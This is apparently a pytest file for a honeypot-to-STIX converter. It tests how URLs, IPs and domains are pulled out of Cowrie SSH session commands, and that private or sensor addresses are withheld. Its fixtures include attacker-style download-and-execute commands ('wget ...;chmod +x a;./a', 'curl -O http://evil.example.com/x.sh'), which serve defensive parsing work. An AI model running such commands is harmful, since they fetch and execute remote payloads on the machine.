"""Cowrie URL hosts (2026-10-06): IPv4 payload hosts become IPv4-Addr
observables linked to their URL, domain hosts get the same edge, URLs stop at
shell separators, and non-public addresses are not published."""
from __future__ import annotations

from datetime import datetime, timedelta, timezone

import tpot2cti.parsers.cowrie as cw


def _session(commands):
    parser = cw.CowrieParser()
    now = datetime.now(timezone.utc)
    base = {"@timestamp": now.isoformat(), "src_ip": "1.2.3.4", "src_port": 50001, "dst_port": 22,
            "session": "deadbeef0042", "t-pot_hostname": "node1", "type": "Cowrie",
            "geoip": {"country_iso_code": "CN"}}
    raw = [{**base, "eventid": cw._CONNECT_EVENTID},
           {**base, "eventid": cw._LOGIN_SUCCESS_EVENTID, "username": "root", "password": "root",
            "@timestamp": (now + timedelta(seconds=1)).isoformat()}]
    for i, c in enumerate(commands):
        raw.append({**base, "eventid": cw._COMMAND_EVENTID, "input": c,
                    "@timestamp": (now + timedelta(seconds=2 + i)).isoformat()})
    events = [e for e in (parser.parse(d) for d in raw) if e]
    return parser.correlate(events)[0]


def _build(session):
    from tpot2cti.parsers.base import _smoketest_env
    _smoketest_env()
    from tpot2cti.config import load_config
    from tpot2cti.stix.builder import STIXBuilder
    return STIXBuilder(load_config()).build_cowrie_session(session)


def test_url_stops_at_shell_separators_and_ip_is_not_a_domain():
    s = _session(["cd /tmp; wget http://9.9.9.9/a;chmod +x a;./a",
                  "curl http://evil.example.com/x.sh,", "wget http://192.168.1.1/r)"])
    assert s.urls == ["http://9.9.9.9/a", "http://evil.example.com/x.sh", "http://192.168.1.1/r"]
    assert s.domains == ["evil.example.com"]


def test_ip_host_becomes_observable_linked_to_its_url():
    objs = _build(_session(["wget http://9.9.9.9/a;sh a", "curl -O http://evil.example.com/x.sh"]))
    by_id = {o["id"]: o for o in objs}
    ips = [o for o in objs if o["type"] == "ipv4-addr" and o.get("value") == "9.9.9.9"]
    assert ips and "attacker-referenced" in (ips[0].get("x_opencti_labels") or [])
    urls = {o["value"]: o["id"] for o in objs if o["type"] == "url"}
    assert "http://9.9.9.9/a" in urls and not any(";" in u for u in urls)
    doms = {o["value"]: o["id"] for o in objs if o["type"] == "domain-name"}
    assert "evil.example.com" in doms
    rels = {(o["source_ref"], o["target_ref"]) for o in objs if o["type"] == "relationship"}
    assert (urls["http://9.9.9.9/a"], ips[0]["id"]) in rels
    assert (urls["http://evil.example.com/x.sh"], doms["evil.example.com"]) in rels
    assert by_id[ips[0]["id"]]["value"] == "9.9.9.9"


def test_private_ip_host_is_not_published():
    objs = _build(_session(["wget http://192.168.1.1/r"]))
    assert not [o for o in objs if o["type"] == "ipv4-addr" and o.get("value") == "192.168.1.1"]


def test_own_sensor_address_is_not_published(monkeypatch):
    # a public sensor address configured as ours: its URL, IPv4 SCO and edge must not appear
    monkeypatch.setenv("TPOT_HONEYPOT_IPS", "8.8.4.4")
    objs = _build(_session(["wget http://8.8.4.4/x;sh x", "wget http://9.9.9.9/a"]))
    assert not [o for o in objs if o["type"] == "ipv4-addr" and o.get("value") == "8.8.4.4"]
    assert not [o for o in objs if o["type"] == "url" and "8.8.4.4" in o.get("value", "")]
    assert [o for o in objs if o["type"] == "ipv4-addr" and o.get("value") == "9.9.9.9"]
